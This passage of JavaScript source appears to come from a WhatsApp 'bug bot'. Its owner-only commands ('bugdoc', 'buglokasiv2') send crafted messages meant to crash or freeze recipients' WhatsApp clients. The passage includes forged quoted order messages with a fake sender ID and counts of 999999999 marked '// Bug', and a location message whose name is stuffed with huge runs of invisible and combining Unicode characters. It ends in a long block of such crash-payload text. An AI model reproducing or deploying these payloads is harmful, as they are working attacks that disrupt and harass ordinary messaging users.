"description": desk(prefix), 
"priceAmount1000": "99999999",
"descriptionCount": "999999999",
  "productImageCount": "1",
  },
  "businessOwnerJid": "62853393885127@s.whatsapp.net",
  "contextInfo": {
  "forwardingScore": 9999,
  "isForwarded": true
  }
  }
  }, {quoted: {
				  key: {
				   fromMe: false,
				   participant: `0@s.whatsapp.net`, // Fake sender Jid
				   remoteJid: "status@broadcast"
				  },
				  message: {
				   orderMessage: {
				    itemCount: 999999999, // Bug
				    status: 1,
				    surface: 1,
				    message: '999999999',
				    orderTitle: '999999999', // Idk what this does
				    sellerJid: `0@s.whatsapp.net` // Seller
				   }
				  }
				 }
				})
  kurzxd.relayWAMessage(res)
  break                            
                  case 'bugdoc': 
  if (!kurz.key.fromMe && !isOwner) return
hmm6 = fs.readFileSync('./src/kurz.txt')
kurzxd.sendMessage(from, hmm6, document, { quoted: {
  key: {
   participant: '0@s.whatsapp.net'
  },
  message: {
   orderMessage: {
    itemCount: 9999999,
    status: 1,
    surface: 1,
    message: 'kurzxd️',
    orderTitle: 'bugdoc〽', // 
    sellerJid: '0@s.whatsapp.net'
   }
  }
 } ,filename:`${ngazap(prefix)}.txt`, mimetype: 'application/txt'})
break
 case 'buglokasiv2':
       if (!kurz.key.fromMe && !isOwner) return
kurzxd.updatePresence(from, Presence.composing)
		       var bro = await getBuffer('./src/logo.jpg')
                     kurzxd.sendMessage(from, {degreesLatitude: 34.0184,
						degreesLongitude: -118.411,
						name: '🔥kurzxd͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏     ̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̘͇͙̟̫͎͎̹̹̍̐̿̈́̈́͊͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏͏̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̡̭͖͉̙͓̳̮̀̈͌́̒͌̅̊̅̈́̍̚͜͜⁤̶͍͋̓̓͐̾̋̓̔͋̈́̎̾̒̇̄͂̄̕͝͡⁢̷̛̯̱̪͍͉̟̆͂́̈́̿͌̈́̋͂͌͂̆̑͋̈́̉͗̈́́͒̚͟͡͝͠⁤̸̢̛̯̠͔̟̰͔̞̮̦̫͔̖̦̿̿̀̊̒́̀̌̂̔̍̓͜͟͡*̴̜̫̘̬̍̓̒̄̉͛̀͒̈́̊̃͑̀̇̎̑͊͗́̕̕̕͟͝͝�̸̡̞͉̦͕̭͈͌̈̓͋̄̿̾͆̏̈̌̑͟͝͝͠ͅ*̴̢̢̘͇͙̟̫͎͎̹̹̪̯̠͎̘̙̥̜͓̍̐̿̈́̈́͊͜?̵̧̧̼͓̞͈͖̲͎̙̞͎͖̙̩̘͂́̔̉̉̍̕͝?̷̣̯̦̲͎͍͑͌̍͋͗͐̂̐̚͜͡͝*̷̧̡̛̺̩̣̥͕̗̫̞̥̱̦̲̝̯̏͆͆̀̀̅͒́̋́͋͐͊͌̒̕͜͝͡͝͝͝�̴̡̧̛̛͖̜̬̯͉̥̣̯̯̠̘̲͕̜̲̭͛́̿́͐̾̀̇̊̽͒̿̽͑̕̕̚̕̚⁤̴̧̡͙͈̲̱̎⁤̶̱̝̲̞̽͌̎̅̌̚͘̚ͅͅ⁤̷̧̛̹̜̟͍̤͚̺̳̥̞̯̰̻̥̟͙͌̏̀̽̓̓͑̽̂̑̾̆͌̋̈́͟͝͡⁤̵͖͚̣̹̖̟̖̙̈͆⁤̸̛͍̘̤̩̳̙̒͛͊͒̇͛́̃͒̎̽̐̈̔̔͂̒̈́͑̕͟͝⁤̷̢͙͚͉͍̲̻̺͖̼͚͙̘̤͙̱̘͓̭͔̩͙̮̰̓̈̇͜⁤̵̨̬̘̥̗̤̺͔̬͍͉̥̠̤͍̘̠̯̝͓̼͍̟̗͕͛̇̅̀͝͡⁤̸̯̯͍͙̱͐̂̈̈́̀͌̀͌̒̉͝⁢̴̡͖̯͇̻̰̫̖͈͚͔̮̠̙͉͎͉͖͉̳̣͍͌͒̒̽͜͜ͅ⁤̵̡̡̝̮̬̺̳̣̗̪̤̳̙͓̣͓̆̿̆̄̓͛̇̐͋̔̍͆̆̎̈̆̊̚̚͟͠͡*̴̛̛͇̻̬̥̄̓̈͐̌̆͒̓͌̓̂̿̆̾̔̊̓̒͂̊͂͘�̵̖̘̦̈́�̸̡̨͍̣̰͖̰̻̗̖̙̙͙̞̙͓̇̊͆̈̊̏͊̇̐̀̽̿̅̍̏͟͟͝͝⁤̵̨̛̞̲̲̦͇̰̳̐̎͂͑͗͆̑̐́̃̽̒̿̽̚̕̕͟⁤̵̯̺̈́̾⁤̴̪͋̐̔̂̇̒̑̅̀̈͘͝͠⁤̴̖̰̮̜̙̎́̆̃͐̀͒̑̎͋̒̿̽́̑̂̓̋̎̓͘͜⁤̷̢̧̡̝͓͈̪̬̩̪̳̣̘͚̳̃̔̌̑́͂͂̓͂̎̒̉͠ͅ⁤̸̢̧̰͓̥̝̣̱͓̳͕̜͚̘̟̟͈͍̦̟͈̤̐̇͗̿̃ͅ⁤̷̭̀̈͌́̒͌̅̊̅̈́̍̚